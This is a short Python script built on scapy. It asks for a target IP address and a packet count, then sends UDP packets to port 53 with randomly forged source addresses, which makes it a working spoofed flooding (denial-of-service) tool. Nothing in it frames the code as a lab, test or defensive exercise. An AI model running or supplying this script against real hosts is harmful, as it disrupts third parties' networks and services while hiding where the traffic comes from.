from scapy.all import IP, UDP, send
import random
target = input("Enter the target IP address: ")
load = int(input("Enter the number of packets to send: "))  
for i in range (0,load):
    src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    ip_packet = IP(src=src_ip, dst=target)
    udp_packet = UDP(sport=random.randint(1024, 65535), dport=53)
    packet = ip_packet / udp_packet
    send(packet, verbose=True)